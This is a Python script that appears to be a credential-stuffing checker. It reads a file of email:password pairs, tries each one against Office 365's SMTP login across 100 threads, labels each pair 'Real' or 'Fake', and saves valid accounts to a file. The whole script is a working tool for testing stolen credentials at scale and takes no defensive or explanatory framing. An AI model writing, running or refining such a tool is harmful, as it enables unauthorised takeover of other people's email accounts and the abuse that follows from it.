import os
import smtplib
import concurrent.futures
import logging
import time
import threading
import signal
import sys

MAX_RETRIES = 10
NUM_THREADS = 100
RETRY_DELAY = 10
LOGIN_TIMEOUT = 30
LOG_FILE = 'successful_logins.txt'
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

accounts_loaded = 0
accounts_checked = 0
accounts_failed = 0
accounts_valid = 0

progress_lock = threading.Lock()

logging.basicConfig(level=logging.ERROR)

def check_credentials(email, password):
    retries = 0
    while retries < MAX_RETRIES:
        try:
            smtp_server = smtplib.SMTP('smtp.office365.com', 587, timeout=LOGIN_TIMEOUT)
            smtp_server.starttls()
            smtp_server.login(email, password)
            with open(LOG_FILE, "a") as log_file:
                log_file.write(f"SMTP Real: {email}\n")
            smtp_server.quit()
            return True
        except smtplib.SMTPAuthenticationError:
            return False
        except (smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected, ConnectionError):
            retries += 1
            time.sleep(RETRY_DELAY)
        except Exception:
            return False
    return False

def process_email(email, password):
    global accounts_checked, accounts_failed, accounts_valid

    with progress_lock:
        accounts_checked += 1

    success = check_credentials(email, password)
    if success:
        print(f"{GREEN}Real: {email}{RESET}")
        with progress_lock:
            accounts_valid += 1
    else:
        print(f"{RED}Fake: {email}{RESET}")
        with progress_lock:
            accounts_failed += 1

def main_worker(emails):
    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        for email, password in emails:
            executor.submit(process_email, email, password)

def update_threads(num_threads):
    global NUM_THREADS
    NUM_THREADS = num_threads

def show_progress():
    global accounts_loaded
    while True:
        with progress_lock:
            total_emails = accounts_loaded
            if accounts_checked >= total_emails:
                break
        time.sleep(1)
    print(f"Result: {accounts_checked}/{accounts_loaded} Checked | Fakes: {accounts_failed} | Real: {accounts_valid}")

def handle_exit(signum, frame):
    sys.exit(0)

def start_script(emails):
    global accounts_loaded
    accounts_loaded = len(emails)
    main_worker(emails)
    show_progress()

def main():
    global checked_emails
    signal.signal(signal.SIGINT, handle_exit)
    print(r"""
                       /^--^\      /^--^\     /^--^\\
                      \\____/     \\____/     \\____/
                     /      \\   /      \\   /      \\
                     |       |   |       |   |       |
                     \\__  __/   \\__  __/   \\__  __/
|^|^|^|^|^|^|^|^|^|^|^|^\\ \\^|^|^|^/ /^|^|^|^|^\\ \\^|^|^|^|^|^|^|^|^|^|^|
| | | | | | | | | | | | |\\ \\| | |/ /| | | | | |\\ \\ | | | | | | | | | | |
########################/ /######\\ \\###########/ /#######################
| | | | | | | | | | | | \\/| | | | \\/| | | | | |\\/ | | | | | | | | | | | |
|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|
""")
    file_path = input("Add TXT about SMTPs: ")
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            emails_to_check = [tuple(line.strip().split(':', 1)) for line in file if line.strip()]

        start_script(emails_to_check)
    except FileNotFoundError:
        logging.error("Incorrect file.")

if __name__ == "__main__":
    main()
